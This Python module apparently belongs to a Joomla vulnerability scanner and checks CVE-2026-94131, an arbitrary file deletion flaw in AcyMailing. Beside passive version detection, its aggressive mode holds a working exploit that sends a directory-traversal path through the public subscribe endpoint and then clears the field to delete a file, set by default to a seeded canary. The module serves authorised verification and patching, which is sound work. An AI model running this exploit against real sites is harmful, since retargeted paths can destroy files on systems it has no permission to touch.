from __future__ import annotations

import re
import secrets
from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-94131"
NAME = "AcyMailing custom file field arbitrary file deletion"
COMPONENT = "AcyMailing"
AFFECTED_RULE = "AcyMailing 1.0.0 through 11.0.x; fixed in 11.1.0"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
SUBSCRIBE_PATH = "/index.php?option=com_acym&ctrl=frontusers&task=subscribe&ajax=1"
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("11.1.0")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("acymailing", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="AcyMailing was not detected through its manifest or component route.", action="No action is required unless AcyMailing is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected AcyMailing {version}, within the affected range below 11.1.0. File-type custom fields can store a request-supplied path and delete it when cleared."
        action = "Upgrade AcyMailing to 11.1.0 or newer and remove file-type custom fields from public forms."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected AcyMailing {version}, which confines custom file field deletions to the upload folder."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "AcyMailing was detected, but its version could not be determined."
        action = "Determine the installed AcyMailing version and upgrade to 11.1.0 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _subscribe(client: HttpClient, base: str, email: str, field_id: int, value: str, timeout: int) -> dict[str, Any]:
    return client.request(
        f"{base}{SUBSCRIBE_PATH}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": BROWSER_UA},
        data=form_encode({"user[email]": email, f"customField[{field_id}]": value, "acy_source": "url"}),
        timeout=timeout,
    )


def run_aggressive_probe(
    target_url: str,
    field_id: int = 1,
    canary_name: str = "proofcms-acym-delete-canary.txt",
    traversal: str = "../../../../../",
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Store a traversal path in a file custom field, then clear it.

    11.0.x ``FieldClass::store()`` accepts a plain string for a ``file``
    custom field and later, when the field is cleared, passes the stored value
    to ``unlink()`` after prefixing the upload folder. ``allow_modif=all``
    lets the same subscriber clear the field. 11.1.0 confines the deletion to
    the upload folder. The probe deletes only a seeded canary.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    canary_url = f"{base}/{canary_name}"
    before = client.get(canary_url, timeout=timeout)
    before_status = 0 if is_transport_error(before) else before.get("status", 0)
    if before_status != 200:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=canary_url, detail="The proofcms-acym-delete-canary.txt file is not publicly readable; seed it in the web root first. Nothing was sent.", action="Create the canary and ensure a file-type custom field exists on a public subscription form.")

    email = f"proofcms-94131-{secrets.token_hex(4)}@example.test"
    target = f"{traversal}{canary_name}"
    stored = _subscribe(client, base, email, field_id, target, timeout)
    if is_transport_error(stored):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{SUBSCRIBE_PATH}", detail=f"The store request failed in transit ({transport_error_detail(stored)}).", action="Retry when the target is reachable.")
    cleared = _subscribe(client, base, email, field_id, "", timeout)
    if is_transport_error(cleared):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{SUBSCRIBE_PATH}", detail=f"The clear request failed in transit ({transport_error_detail(cleared)}).", action="Retry when the target is reachable.")

    after = client.get(canary_url, timeout=timeout)
    after_status = 0 if is_transport_error(after) else after.get("status", 0)
    gone = before_status == 200 and after_status == 404
    evidence = {
        "field_id": field_id,
        "email": email,
        "target_path": target,
        "canary_url": canary_url,
        "canary_status_before": before_status,
        "canary_status_after": after_status,
        "store_status": stored.get("status"),
        "clear_status": cleared.get("status"),
        "canary_gone": gone,
    }
    if gone:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{SUBSCRIBE_PATH}",
            evidence=evidence,
            detail=(
                "A public subscriber stored a traversal path in a file-type custom field and then cleared it; "
                "the framework unlinked the resolved path outside the upload folder. The probe removed only the "
                "seeded proofcms-acym-delete-canary.txt file."
            ),
            action="Upgrade AcyMailing to 11.1.0 or newer and remove file-type custom fields from public forms.",
        )
    status = "BLOCKED_EXTERNAL" if stored.get("status") in (401, 403) or cleared.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{SUBSCRIBE_PATH}",
        evidence=evidence,
        detail=(
            f"The canary survived (before={before_status}, after={after_status}); 11.1.0 confines the deletion, "
            "or the site does not allow subscribers to clear the field (allow_modif=all)."
        ),
        action="Upgrade affected AcyMailing versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_acym"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The AcyMailing page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The AcyMailing page is reachable; the custom-field deletion payload was not sent in safe mode.", action="Use aggressive mode with a seeded canary on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because AcyMailing was not detected as potentially affected."
            return passive
        field_value = aggressive_value(aggressive_args, aggressive_command, "field_id")
        result = run_aggressive_probe(
            target_url,
            field_id=int(field_value) if field_value and field_value.isdigit() else 1,
            canary_name=aggressive_value(aggressive_args, aggressive_command, "canary_name") or "proofcms-acym-delete-canary.txt",
            traversal=aggressive_value(aggressive_args, aggressive_command, "traversal") or "../../../../../",
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (AcyMailing reachability) and aggressive (custom file field deletion) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Arbitrary File Deletion", "module_version": "1.0.0", "last_reviewed": "2026-11-17", "updated": "2026-11-17", "required_detectors": ["acymailing"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-94131", "https://www.acymailing.com/security/cve-2026-94131/", "https://mysites.guru/vulnerabilities/CVE-2026-94131/"]}
